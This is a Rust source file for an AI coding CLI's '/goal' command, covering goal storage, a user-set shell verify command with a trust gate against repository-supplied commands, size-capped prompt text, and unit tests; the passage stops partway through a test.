//! `/goal` command handler — persistent session/project goals.
//!
//! Goals are stored as plain text in `.yoyo/goal.md`, making them
//! human-readable and version-controllable.

use crate::dispatch::CommandResult;
use crate::format::*;
use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};

/// Default goal file path (project-local).
const GOAL_FILE: &str = ".yoyo/goal.md";

/// Verify command file path (project-local).
const VERIFY_FILE: &str = ".yoyo/goal_verify.md";

/// Maximum bytes of verify-command output that reach a prompt or the display.
const VERIFY_OUTPUT_MAX: usize = 2000;

/// Cap verify-command output, marking the cut **in-band**.
///
/// Pure, so the decision is testable without spawning a shell. Under budget the
/// return value is byte-identical to the input, so the common (short) case is
/// unchanged.
///
/// Why the marker: this string has two consumers — the stderr status block and,
/// via `/goal check`, an actual **prompt** sent to the model. A silent cut hands
/// the model the head of a test run and lets it read a missing `test result: ok`
/// line as a failure (or a vanished error as a pass). Repo convention: every
/// elision layer marks its own cuts. Cuts on a char boundary, never a byte index.
fn cap_verify_output(output: &str) -> String {
    if output.len() <= VERIFY_OUTPUT_MAX {
        return output.to_string();
    }
    let head = safe_truncate(output, VERIFY_OUTPUT_MAX);
    let elided = output.len() - head.len();
    format!(
        "{head}\n… [yoyo: verify output truncated — {shown} of {total} bytes shown, \
         {elided} elided. Re-run the verify command yourself for the full output.]",
        shown = head.len(),
        total = output.len(),
    )
}

/// Maximum bytes of the goal text that reach a *prompt*.
///
/// A judgment threshold, not a measurement: 4 KB is roughly 1k tokens, generous
/// for a sentence-or-checklist goal and far under the 60 KB a pasted spec can
/// reach. It exists because the goal is appended to the **system prompt**
/// (`src/cli.rs`, beside `load_project_context` and `generate_repo_map_for_prompt`,
/// which are bounded by `MAX_PROJECT_FILES` and `REPO_MAP_MAX_CHARS`) and so is
/// paid on **every turn of every session** until cleared, not once (#755).
/// Deliberately smaller than the repo map's 16 KB: a goal is a statement of
/// intent, not a structural index.
const GOAL_PROMPT_MAX_BYTES: usize = 4000;

/// Cap the goal text for prompt use, marking the cut in-band.
///
/// Pure — no I/O. Display paths (`/goal show`, `/status`, `yoyo goal show`) keep
/// the **full** text; only prompt paths pass through here, so nothing a user
/// reads about their own goal is silently shortened. Under budget the return
/// value is byte-identical to the input, which is the common case.
///
/// The cut is announced (repo convention: every elision layer marks its cuts —
/// a silent elision is the bug) and names the file, so the model is told that a
/// longer goal exists rather than being handed a sentence that stops mid-word
/// as if that were the whole intent. Cuts on a char boundary, never a byte index.
fn truncate_goal_for_prompt(goal: &str) -> String {
    if goal.len() <= GOAL_PROMPT_MAX_BYTES {
        return goal.to_string();
    }
    let head = crate::format::safe_truncate(goal, GOAL_PROMPT_MAX_BYTES);
    let elided = goal.len() - head.len();
    format!(
        "{head}\n\n… [yoyo: goal truncated for the prompt — {shown} of {total} bytes shown, \
         {elided} elided. Full text: {GOAL_FILE} (/goal show)]",
        shown = head.len(),
        total = goal.len(),
    )
}

/// Load the current goal for **prompt** use, capped by [`GOAL_PROMPT_MAX_BYTES`].
///
/// Prompt call sites must use this instead of [`load_goal`]; display call sites
/// must not.
pub fn goal_for_prompt() -> Option<String> {
    goal_for_prompt_in(Path::new("."))
}

/// Load the goal under `dir` for **prompt** use, capped by [`GOAL_PROMPT_MAX_BYTES`].
///
/// The directory-taking sibling of [`goal_for_prompt`]; the CWD-reading wrapper is a
/// thin call with the process root. Behaviour for a given directory is unchanged.
fn goal_for_prompt_in(dir: &Path) -> Option<String> {
    load_goal_in(dir).map(|g| truncate_goal_for_prompt(&g))
}

/// Load the current goal from `.yoyo/goal.md`, if it exists.
///
/// Thin wrapper over [`load_goal_in`] rooted at the process CWD — behaviour is
/// byte-identical to before this seam existed.
pub fn load_goal() -> Option<String> {
    load_goal_in(Path::new("."))
}

/// Load the goal from `<dir>/.yoyo/goal.md`, if it exists.
///
/// The `*_in(dir)` half of the `run_git`/`run_git_in` pattern (see `src/git.rs`):
/// callers that must not depend on the process-global working directory — every
/// test, and anything reached from a `*_in` function — pass their own root.
pub fn load_goal_in(dir: &Path) -> Option<String> {
    let path = dir.join(GOAL_FILE);
    if path.exists() {
        fs::read_to_string(path).ok().and_then(|s| {
            let trimmed = s.trim();
            if trimmed.is_empty() {
                None
            } else {
                Some(trimmed.to_string())
            }
        })
    } else {
        None
    }
}

/// Save a goal to `.yoyo/goal.md`, creating the directory if needed.
fn save_goal(goal: &str) -> Result<(), String> {
    let path = Path::new(GOAL_FILE);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create .yoyo/ directory: {e}"))?;
    }
    fs::write(path, format!("{goal}\n")).map_err(|e| format!("Failed to write goal file: {e}"))?;
    Ok(())
}

/// Remove the goal file.
fn clear_goal() -> Result<(), String> {
    let path = Path::new(GOAL_FILE);
    if path.exists() {
        fs::remove_file(path).map_err(|e| format!("Failed to remove goal file: {e}"))?;
    }
    Ok(())
}

// ── Verify command helpers ──────────────────────────────────────────

/// Save a verification command to `.yoyo/goal_verify.md`.
fn save_verify_command(cmd: &str) -> Result<(), String> {
    let path = Path::new(VERIFY_FILE);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create .yoyo/ directory: {e}"))?;
    }
    fs::write(path, format!("{cmd}\n")).map_err(|e| format!("Failed to write verify file: {e}"))?;
    Ok(())
}

/// Load the verification command, if one is set.
pub fn load_verify_command() -> Option<String> {
    let path = Path::new(VERIFY_FILE);
    if path.exists() {
        fs::read_to_string(path).ok().and_then(|s| {
            let trimmed = s.trim();
            if trimmed.is_empty() {
                None
            } else {
                Some(trimmed.to_string())
            }
        })
    } else {
        None
    }
}

/// Remove the verification command file.
fn clear_verify_command() -> Result<(), String> {
    let path = Path::new(VERIFY_FILE);
    if path.exists() {
        fs::remove_file(path).map_err(|e| format!("Failed to remove verify file: {e}"))?;
    }
    Ok(())
}

/// Set when the user typed `/goal verify '<cmd>'` **in this session**.
///
/// A command the user typed with their own hands is the user's own word — the same
/// reasoning that keeps a `--allow` flag out of #749's permission gate. This is a
/// per-process flag on purpose: it says nothing about who wrote the *file*, only
/// that this session's user authored the command now sitting in it.
static VERIFY_SET_THIS_SESSION: AtomicBool = AtomicBool::new(false);

/// Record that this session's user set the verify command themselves.
fn mark_verify_set_this_session() {
    VERIFY_SET_THIS_SESSION.store(true, Ordering::Relaxed);
}

/// Did this session's user set the verify command themselves?
fn verify_set_this_session() -> bool {
    VERIFY_SET_THIS_SESSION.load(Ordering::Relaxed)
}

/// Test-only: clear the session flag so a test can observe the refusing branch.
/// Every test that touches it is `#[serial]`, since the flag is process-wide.
#[cfg(test)]
fn reset_verify_set_this_session() {
    VERIFY_SET_THIS_SESSION.store(false, Ordering::Relaxed);
}

/// Whether a project-authored verify command may be executed. Two explicit states.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum GoalVerifyGate {
    /// Execute the command.
    Run,
    /// Do not execute it; announce the refusal instead.
    Refused,
}

/// Decide whether `.yoyo/goal_verify.md` may be executed. Pure — no I/O, no exit.
///
/// `.yoyo/goal_verify.md` is a **project-local** file holding a shell command that
/// `/goal check` runs. Cloning a stranger's repo and typing `/goal check` used to run
/// their command with no prompt and nothing displayed — the same "the repository
/// authored this, not the user" surface #748 gated for `.yoyo.toml` MCP servers and
/// #749 item 3 for the privilege-granting half of `[permissions]`.
///
/// This deliberately does **not** try to answer "did *this* user write the file".
/// The repo cannot tell: a command the user typed last week and one a stranger
/// committed are the same bytes on disk. Refusing by default and naming both
/// hatches is the honest resolution, not a provenance check dressed up as one.
pub(crate) fn gate_goal_verify(trusted: bool, set_this_session: bool) -> GoalVerifyGate {
    if trusted || set_this_session {
        GoalVerifyGate::Run
    } else {
        GoalVerifyGate::Refused
    }
}

/// Maximum bytes of the refused command echoed back in the refusal block.
const REFUSAL_CMD_MAX_BYTES: usize = 400;

/// The stderr block shown when a project-authored verify command is refused.
///
/// Pure and ANSI-free (the caller applies color), so the promise a user actually
/// reads is pinned by a test rather than only the boolean underneath it. `plain`
/// drops the glyph for screen-reader / `--screen-reader` output. The command is
/// echoed **verbatim** — a user cannot judge what they cannot see — truncated on a
/// char boundary with the cut marked in-band if it is huge.
pub(crate) fn goal_verify_refusal_message(cmd: &str, plain: bool) -> String {
    let marker = if plain { "" } else { "⚠ " };
    let shown = if cmd.len() <= REFUSAL_CMD_MAX_BYTES {
        cmd.to_string()
    } else {
        let head = safe_truncate(cmd, REFUSAL_CMD_MAX_BYTES);
        format!(
            "{head}… [yoyo: command truncated for display — {shown} of {total} bytes shown]",
            shown = head.len(),
            total = cmd.len(),
        )
    };
    format!(
        "{marker}A project-local {VERIFY_FILE} holds a shell command. yoyo did not run it:\n    \
         {shown}\n  \
         This file came with the project, not necessarily from you, and yoyo cannot tell which.\n  \
         Nothing was executed. Re-run with --trust-project to run it this session, or type\n  \
         /goal verify '<cmd>' to make it your own command for this session."
    )
}

/// Load the verify command **only if** it is permitted to run, announcing refusals.
///
/// The single seam every execution path goes through, so the two call sites cannot
/// disagree about what is allowed. Returns `None` both when no command is set and
/// when one is set but refused — the refusal is announced on stderr (silent under
/// `is_quiet()`, glyph-free under `is_plain_output()`), never silent otherwise.
fn verify_command_if_permitted() -> Option<String> {
    let cmd = load_verify_command()?;
    match gate_goal_verify(crate::cli::is_trust_project(), verify_set_this_session()) {
        GoalVerifyGate::Run => Some(cmd),
        GoalVerifyGate::Refused => {
            if !is_quiet() {
                let msg = goal_verify_refusal_message(&cmd, crate::format::is_plain_output());
                eprintln!("{YELLOW}{msg}{RESET}");
            }
            None
        }
    }
}

/// Run the verification command and return `(exit_code, output)`.
///
/// Runs via `sh -c` so pipes, redirects, etc. work. Output is
/// stdout+stderr merged, truncated to `VERIFY_OUTPUT_MAX` bytes.
fn run_verify_command(cmd: &str) -> (i32, String) {
    match std::process::Command::new("sh").args(["-c", cmd]).output() {
        Ok(output) => {
            let code = output.status.code().unwrap_or(-1);
            let mut combined = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() {
                if !combined.is_empty() {
                    combined.push('\n');
                }
                combined.push_str(&stderr);
            }
            (code, cap_verify_output(&combined))
        }
        Err(e) => (-1, format!("Failed to run verify command: {e}")),
    }
}

/// Auto-run the goal verification command after a prompt turn.
///
/// Returns `None` if no verify command is set.
/// Returns `Some((passed, output))` where `passed` is true when exit code == 0.
/// Prints a status line to stderr so the agent (and user) can see the result.
pub fn run_goal_verify_after_prompt() -> Option<(bool, String)> {
    let cmd = verify_command_if_permitted()?;
    let (code, output) = run_verify_command(&cmd);
    let passed = code == 0;

    if passed {
        eprintln!("{GREEN}  ✓ Goal verify passed{RESET}");
    } else {
        // `output` is already capped and cut-marked by `cap_verify_output`, so the
        // re-truncation that used to live here could never fire (its `(truncated)`
        // marker was structurally dead while the real cut upstream was silent).
        eprintln!("{YELLOW}  ⚠ Goal verify failed (exit {code}):{RESET}");
        for line in output.lines().take(10) {
            eprintln!("{DIM}    {line}{RESET}");
        }
    }

    Some((passed, output))
}

/// Format the current goal for display.
fn format_goal(goal: &str) -> String {
    format!("{BOLD}Current goal:{RESET}\n\n  {goal}\n\n{DIM}(stored in {GOAL_FILE}){RESET}")
}

/// Handle the `/goal` command and its subcommands.
///
/// Returns `CommandResult` because `/goal check` needs to send a prompt to the agent.
pub fn handle_goal(input: &str) -> CommandResult {
    let arg = input.strip_prefix("/goal").unwrap_or("").trim();

    if arg.is_empty() || arg == "show" {
        // /goal or /goal show — display current goal
        match load_goal() {
            Some(goal) => {
                println!("{}\n", format_goal(&goal));
                if let Some(vcmd) = load_verify_command() {
                    println!("{BOLD}Verify command:{RESET} {vcmd}\n");
                }
                CommandResult::Continue
            }
            None => {
                println!("{DIM}No goal set. Use /goal set <description> to set one.{RESET}\n");
                CommandResult::Continue
            }
        }
    } else if let Some(description) = arg.strip_prefix("set") {
        let description = description.trim();
        if description.is_empty() {
            println!(
                "{YELLOW}Usage: /goal set <description>{RESET}\n\n\
                 Example: /goal set Refactor the auth module to use JWT tokens\n"
            );
            CommandResult::Continue
        } else {
            match save_goal(description) {
                Ok(()) => {
                    println!(
                        "{GREEN}Goal set:{RESET} {description}\n\n\
                         {DIM}Saved to {GOAL_FILE}{RESET}\n"
                    );
                    CommandResult::Continue
                }
                Err(e) => {
                    eprintln!("{RED}{e}{RESET}\n");
                    CommandResult::Continue
                }
            }
        }
    } else if arg == "clear" {
        match load_goal() {
            Some(_) => {
                let mut ok = true;
                if let Err(e) = clear_goal() {
                    eprintln!("{RED}{e}{RESET}\n");
                    ok = false;
                }
                if let Err(e) = clear_verify_command() {
                    eprintln!("{RED}{e}{RESET}\n");
                    ok = false;
                }
                if ok {
                    println!("{GREEN}Goal cleared.{RESET}\n");
                }
                CommandResult::Continue
            }
            None => {
                println!("{DIM}No goal to clear.{RESET}\n");
                CommandResult::Continue
            }
        }
    } else if let Some(verify_arg) = arg.strip_prefix("verify") {
        let verify_arg = verify_arg.trim();
        if verify_arg.is_empty() {
            // /goal verify — show current verify command
            match load_verify_command() {
                Some(vcmd) => {
                    println!(
                        "{BOLD}Verify command:{RESET} {vcmd}\n\n\
                         {DIM}(stored in {VERIFY_FILE}){RESET}\n"
                    );
                }
                None => {
                    println!(
                        "{DIM}No verify command set. \
                         Use /goal verify <command> to set one.{RESET}\n"
                    );
                }
            }
            CommandResult::Continue
        } else if verify_arg == "clear" {
            match load_verify_command() {
                Some(_) => match clear_verify_command() {
                    Ok(()) => {
                        println!("{GREEN}Verify command cleared.{RESET}\n");
                    }
                    Err(e) => {
                        eprintln!("{RED}{e}{RESET}\n");
                    }
                },
                None => {
                    println!("{DIM}No verify command to clear.{RESET}\n");
                }
            }
            CommandResult::Continue
        } else {
            // /goal verify <command>
            match save_verify_command(verify_arg) {
                Ok(()) => {
                    // The user typed this command themselves, so it runs without a
                    // trust gate for the rest of this session (see `gate_goal_verify`).
                    mark_verify_set_this_session();
                    println!(
                        "{GREEN}Verify command set:{RESET} {verify_arg}\n\n\
                         {DIM}Saved to {VERIFY_FILE}. \
                         Will run automatically on /goal check.{RESET}\n"
                    );
                }
                Err(e) => {
                    eprintln!("{RED}{e}{RESET}\n");
                }
            }
            CommandResult::Continue
        }
    } else if arg == "check" {
        match goal_for_prompt() {
            Some(goal) => {
                let verify_section = if let Some(vcmd) = verify_command_if_permitted() {
                    let (code, output) = run_verify_command(&vcmd);
                    format!(
                        "\n\nVerification command: {vcmd}\n\
                         Verification output:\n{output}\n\
                         Exit code: {code}"
                    )
                } else {
                    String::new()
                };
                let prompt = format!(
                    "My current goal is:\n\n{goal}{verify_section}\n\n\
                     Based on the conversation history{verif_note}, evaluate my progress:\n\
                     1. What's been accomplished so far\n\
                     2. What's remaining\n\
                     3. Any blockers or concerns\n\
                     4. Suggested next steps",
                    verif_note = if verify_section.is_empty() {
                        ""
                    } else {
                        " and verification results"
                    }
                );
                CommandResult::SendToAgent(prompt)
            }
            None => {
                println!("{DIM}No goal set. Use /goal set <description> first.{RESET}\n");
                CommandResult::Continue
            }
        }
    } else {
        println!(
            "{YELLOW}Unknown subcommand: {arg}{RESET}\n\n\
             Usage:\n\
             \x20 /goal              Show current goal\n\
             \x20 /goal set <desc>   Set a new goal\n\
             \x20 /goal show         Show current goal\n\
             \x20 /goal clear        Remove current goal\n\
             \x20 /goal check        Ask AI to evaluate progress\n\
             \x20 /goal verify <cmd> Set a verification command\n\
             \x20 /goal verify       Show current verify command\n\
             \x20 /goal verify clear Remove verify command\n"
        );
        CommandResult::Continue
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serial_test::serial;
    use std::env;
    use tempfile::TempDir;

    /// Helper: run a test body with CWD set to a temp directory.
    fn with_temp_dir<F: FnOnce()>(f: F) {
        let tmp = TempDir::new().expect("create temp dir");
        let prev = env::current_dir().expect("get cwd");
        env::set_current_dir(tmp.path()).expect("set cwd");
        f();
        env::set_current_dir(prev).expect("restore cwd");
    }

    #[test]
    #[serial]
    fn test_load_goal_none_when_missing() {
        with_temp_dir(|| {
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_save_and_load_roundtrip() {
        with_temp_dir(|| {
            save_goal("Build the authentication module").unwrap();
            let loaded = load_goal();
            assert!(loaded.is_some());
            assert_eq!(loaded.unwrap(), "Build the authentication module");
        });
    }

    #[test]
    #[serial]
    fn test_save_creates_directory() {
        with_temp_dir(|| {
            assert!(!Path::new(".yoyo").exists());
            save_goal("test goal").unwrap();
            assert!(Path::new(".yoyo").exists());
            assert!(Path::new(GOAL_FILE).exists());
        });
    }

    #[test]
    #[serial]
    fn test_clear_goal() {
        with_temp_dir(|| {
            save_goal("temporary goal").unwrap();
            assert!(load_goal().is_some());
            clear_goal().unwrap();
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_clear_goal_no_file() {
        with_temp_dir(|| {
            // Should not error when no file exists
            assert!(clear_goal().is_ok());
        });
    }

    #[test]
    #[serial]
    fn test_load_goal_empty_file() {
        with_temp_dir(|| {
            fs::create_dir_all(".yoyo").unwrap();
            fs::write(GOAL_FILE, "   \n  \n").unwrap();
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_show_no_goal() {
        with_temp_dir(|| {
            let result = handle_goal("/goal");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_show_explicit() {
        with_temp_dir(|| {
            let result = handle_goal("/goal show");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_set_and_show() {
        with_temp_dir(|| {
            let result = handle_goal("/goal set Refactor the parser");
            assert!(matches!(result, CommandResult::Continue));
            let loaded = load_goal().expect("goal should be saved");
            assert_eq!(loaded, "Refactor the parser");
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_set_empty() {
        with_temp_dir(|| {
            let result = handle_goal("/goal set");
            assert!(matches!(result, CommandResult::Continue));
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_set_whitespace_only() {
        with_temp_dir(|| {
            let result = handle_goal("/goal set   ");
            assert!(matches!(result, CommandResult::Continue));
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_clear() {
        with_temp_dir(|| {
            save_goal("going away").unwrap();
            let result = handle_goal("/goal clear");
            assert!(matches!(result, CommandResult::Continue));
            assert!(load_goal().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_clear_no_goal() {
        with_temp_dir(|| {
            let result = handle_goal("/goal clear");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_check_with_goal() {
        with_temp_dir(|| {
            save_goal("Implement caching layer").unwrap();
            let result = handle_goal("/goal check");
            match result {
                CommandResult::SendToAgent(prompt) => {
                    assert!(prompt.contains("Implement caching layer"));
                    assert!(prompt.contains("progress"));
                }
                other => panic!("Expected SendToAgent, got {other:?}"),
            }
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_check_no_goal() {
        with_temp_dir(|| {
            let result = handle_goal("/goal check");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_unknown_subcommand() {
        with_temp_dir(|| {
            let result = handle_goal("/goal badcmd");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_goal_multiline_content() {
        with_temp_dir(|| {
            save_goal("Line one\nLine two\nLine three").unwrap();
            let loaded = load_goal().expect("should load");
            assert!(loaded.contains("Line one"));
            assert!(loaded.contains("Line three"));
        });
    }

    #[test]
    fn test_goal_in_known_commands() {
        assert!(
            crate::commands::KNOWN_COMMANDS.contains(&"/goal"),
            "/goal should be in KNOWN_COMMANDS"
        );
    }

    #[test]
    fn test_goal_help_exists() {
        let help = crate::help::command_help("goal");
        assert!(help.is_some(), "goal should have help text");
        let text = help.unwrap();
        assert!(text.contains("/goal set"));
        assert!(text.contains("/goal clear"));
        assert!(text.contains("/goal check"));
    }

    #[test]
    fn test_goal_in_help_text() {
        let text = crate::help::help_text();
        assert!(text.contains("/goal"), "/goal should appear in help text");
    }

    #[test]
    fn test_goal_short_description() {
        let desc = crate::help::command_short_description("goal");
        assert!(desc.is_some(), "goal should have a short description");
    }

    #[test]
    #[serial]
    fn test_goal_system_prompt_injection() {
        with_temp_dir(|| {
            // No goal → no injection
            let mut prompt = String::from("base prompt");
            if let Some(goal) = load_goal() {
                prompt.push_str("\n\n# Current Goal\n\n");
                prompt.push_str(&goal);
                prompt.push_str(
                    "\n\n(Set via /goal set. The user is working toward this. Keep it in mind.)",
                );
            }
            assert_eq!(prompt, "base prompt");

            // With goal → injection present
            save_goal("Refactor auth module").unwrap();
            let mut prompt2 = String::from("base prompt");
            if let Some(goal) = load_goal() {
                prompt2.push_str("\n\n# Current Goal\n\n");
                prompt2.push_str(&goal);
                prompt2.push_str(
                    "\n\n(Set via /goal set. The user is working toward this. Keep it in mind.)",
                );
            }
            assert!(prompt2.contains("# Current Goal"));
            assert!(prompt2.contains("Refactor auth module"));
            assert!(prompt2.contains("Keep it in mind"));
        });
    }

    #[test]
    fn test_goal_help_mentions_auto_context() {
        let help = crate::help::command_help("goal").expect("goal help should exist");
        assert!(
            help.contains("automatically included"),
            "goal help should mention automatic context injection"
        );
    }

    // ── Verify command tests ────────────────────────────────────────

    #[test]
    #[serial]
    fn test_save_and_load_verify_command() {
        with_temp_dir(|| {
            save_verify_command("cargo test --test auth").unwrap();
            let loaded = load_verify_command();
            assert_eq!(loaded.as_deref(), Some("cargo test --test auth"));
        });
    }

    #[test]
    #[serial]
    fn test_clear_verify_removes_file() {
        with_temp_dir(|| {
            save_verify_command("make check").unwrap();
            assert!(load_verify_command().is_some());
            clear_verify_command().unwrap();
            assert!(load_verify_command().is_none());
            assert!(!Path::new(VERIFY_FILE).exists());
        });
    }

    #[test]
    #[serial]
    fn test_goal_clear_also_clears_verify() {
        with_temp_dir(|| {
            save_goal("ship v1").unwrap();
            save_verify_command("cargo test").unwrap();
            let result = handle_goal("/goal clear");
            assert!(matches!(result, CommandResult::Continue));
            assert!(load_goal().is_none());
            assert!(load_verify_command().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_run_verify_command_captures_output() {
        with_temp_dir(|| {
            let (code, output) = run_verify_command("echo hello");
            assert_eq!(code, 0);
            assert!(output.contains("hello"));
        });
    }

    #[test]
    #[serial]
    fn test_run_verify_command_captures_exit_code() {
        with_temp_dir(|| {
            let (code, _output) = run_verify_command("false");
            assert_ne!(code, 0);
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_verify_no_args_shows_current() {
        with_temp_dir(|| {
            // No verify command set
            let result = handle_goal("/goal verify");
            assert!(matches!(result, CommandResult::Continue));

            // With verify command set
            save_verify_command("cargo test").unwrap();
            let result = handle_goal("/goal verify");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_show_includes_verify() {
        with_temp_dir(|| {
            save_goal("Build feature X").unwrap();
            save_verify_command("cargo test --test feature_x").unwrap();
            // /goal show should succeed (we can't easily capture println
            // but we verify it doesn't panic and returns Continue)
            let result = handle_goal("/goal show");
            assert!(matches!(result, CommandResult::Continue));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_verify_set_command() {
        with_temp_dir(|| {
            let result = handle_goal("/goal verify cargo test --test auth");
            assert!(matches!(result, CommandResult::Continue));
            let loaded = load_verify_command();
            assert_eq!(loaded.as_deref(), Some("cargo test --test auth"));
        });
    }

    #[test]
    #[serial]
    fn test_handle_goal_verify_clear() {
        with_temp_dir(|| {
            save_verify_command("make check").unwrap();
            let result = handle_goal("/goal verify clear");
            assert!(matches!(result, CommandResult::Continue));
            assert!(load_verify_command().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_goal_check_with_verify_includes_output() {
        with_temp_dir(|| {
            save_goal("Echo test goal").unwrap();
            // The user set this command themselves in this session, which is what
            // the trust gate asks about (`gate_goal_verify`).
            mark_verify_set_this_session();
            save_verify_command("echo verify_output_marker").unwrap();
            let result = handle_goal("/goal check");
            match result {
                CommandResult::SendToAgent(prompt) => {
                    assert!(prompt.contains("Echo test goal"));
                    assert!(prompt.contains("Verification command:"));
                    assert!(prompt.contains("verify_output_marker"));
                    assert!(prompt.contains("Exit code: 0"));
                    assert!(prompt.contains("verification results"));
                }
                other => panic!("Expected SendToAgent, got {other:?}"),
            }
        });
    }

    #[test]
    #[serial]
    fn test_goal_check_without_verify_unchanged() {
        with_temp_dir(|| {
            save_goal("Plain goal").unwrap();
            let result = handle_goal("/goal check");
            match result {
                CommandResult::SendToAgent(prompt) => {
                    assert!(prompt.contains("Plain goal"));
                    assert!(!prompt.contains("Verification command:"));
                    assert!(!prompt.contains("verification results"));
                }
                other => panic!("Expected SendToAgent, got {other:?}"),
            }
        });
    }

    #[test]
    #[serial]
    fn test_auto_verify_none_when_no_command() {
        with_temp_dir(|| {
            let result = run_goal_verify_after_prompt();
            assert!(result.is_none());
        });
    }

    #[test]
    #[serial]
    fn test_auto_verify_passes_when_command_succeeds() {
        with_temp_dir(|| {
            mark_verify_set_this_session();
            save_verify_command("echo ok").unwrap();
            let result = run_goal_verify_after_prompt();
            assert!(result.is_some());
            let (passed, output) = result.unwrap();
            assert!(passed);
            assert!(output.contains("ok"));
        });
    }

    #[test]
    #[serial]
    fn test_auto_verify_fails_when_command_fails() {
        with_temp_dir(|| {
            mark_verify_set_this_session();
            save_verify_command("exit 1").unwrap();
            let result = run_goal_verify_after_prompt();
            assert!(result.is_some());
            let (passed, _output) = result.unwrap();
            assert!(!passed);
        });
    }

    // ---- the two size caps (both shipped untested; pinned Day 167) ----------
    //
    // Both are pure and both are *user-visible*: one decides what the model is
    // told about a failing verify run, the other what the model is told the
    // user's goal is. The assertions below sit at the emission point — the
    // string a caller actually receives — and the numbers in the cut marker are
    // checked against the returned string's own length, not recomputed with the
    // helper under test.

    /// Split a capped string at its in-band cut marker, returning
    /// `(kept_prefix, marker_tail)`.
    fn split_at_marker<'a>(s: &'a str, marker: &str) -> (&'a str, &'a str) {
        let idx = s
            .find(marker)
            .unwrap_or_else(|| panic!("expected cut marker {marker:?} in output"));
        (&s[..idx], &s[idx..])
    }

    #[test]
    fn test_cap_verify_output_under_budget_is_byte_identical() {
        // The common case, and the regression risk: short output must pass
        // through untouched — no marker, no reflow, not even a trailing newline.
        let short = "test result: ok. 42 passed; 0 failed\n";
        assert_eq!(cap_verify_output(short), short);
        assert_eq!(cap_verify_output(""), "");

        // Exactly at the budget is still under it (inclusive boundary).
        let exact = "x".repeat(VERIFY_OUTPUT_MAX);
        assert_eq!(cap_verify_output(&exact), exact);
    }

    #[test]
    fn test_cap_verify_output_over_budget_marks_cut_on_char_boundary() {
        // `✓` is 3 bytes, so a naive `s.truncate(2000)` would land inside a
        // character and panic — 2000 is not a multiple of 3.
        let big: String = "✓".repeat(VERIFY_OUTPUT_MAX);
        assert!(big.len() > VERIFY_OUTPUT_MAX);
        let capped = cap_verify_output(&big);

        let (kept, tail) = split_at_marker(&capped, "\n… [yoyo: verify output truncated");
        assert!(big.starts_with(kept), "kept text must be a prefix of input");
        assert!(
            big.is_char_boundary(kept.len()),
            "cut at {} is not a char boundary",
            kept.len()
        );
        assert!(kept.len() <= VERIFY_OUTPUT_MAX);
        // The reported numbers must describe the string actually returned.
        assert!(
            tail.contains(&format!("{} of {} bytes shown", kept.len(), big.len())),
            "marker numbers disagree with the returned string: {tail}"
        );
        assert!(
            tail.contains(&format!("{} elided", big.len() - kept.len())),
            "elided count disagrees with the returned string: {tail}"
        );
    }

    #[test]
    #[serial]
    fn test_run_verify_command_caps_output_at_emission_point() {
        // Emission point: what `/goal check` and the post-prompt path actually
        // receive, not the pure helper one layer down.
        with_temp_dir(|| {
            let (code, output) = run_verify_command("for i in $(seq 1 2000); do printf '✓✓'; done");
            assert_eq!(code, 0);
            assert!(output.contains("… [yoyo: verify output truncated"));
            assert!(
                output.len() < 8000,
                "output was not capped: {}",
                output.len()
            );
        });
    }

    #[test]
    #[serial]
    fn test_goal_for_prompt_under_budget_is_byte_identical() {
        with_temp_dir(|| {
            let goal = "Ship the ✓ gate and keep the tests green";
            save_goal(goal).unwrap();
            assert_eq!(goal_for_prompt().unwrap(), goal);
            // No goal at all stays `None` rather than becoming an empty string.
            clear_goal().unwrap();
            assert!(goal_for_prompt().is_none());
        });
    }

    #[test]
    #[serial]
    fn test_goal_for_prompt_over_budget_cuts_while_show_stays_uncapped() {
        with_temp_dir(|| {
            let goal: String = "✓".repeat(GOAL_PROMPT_MAX_BYTES);
            assert!(goal.len() > GOAL_PROMPT_MAX_BYTES);
            save_goal(&goal).unwrap();

            let prompt = goal_for_prompt().expect("goal is set");
            let (kept, tail) =
                split_at_marker(&prompt, "\n\n… [yoyo: goal truncated for the prompt");
            assert!(goal.starts_with(kept));
            assert!(
                goal.is_char_boundary(kept.len()),
                "cut at {} is not a char boundary",
                kept.len()
            );
            assert!(kept.len() <= GOAL_PROMPT_MAX_BYTES);
            assert!(
                tail.contains(&format!("{} of {} bytes shown", kept.len(), goal.len())),
                "marker numbers disagree with the returned string: {tail}"
            );
            assert!(tail.contains(&format!("{} elided", goal.len() - kept.len())));

            // The display half is supposed to stay uncapped — assert it.
            assert_eq!(load_goal().unwrap(), goal);
            assert!(!format_goal(&goal).contains("goal truncated for the prompt"));
        });
    }

    // ---- the project-authored verify-command trust gate (#761) --------------

    #[test]
    fn test_gate_goal_verify_table() {
        // (trusted, set_this_session) -> verdict. Every combination, stated once.
        let cases = [
            (false, false, GoalVerifyGate::Refused),
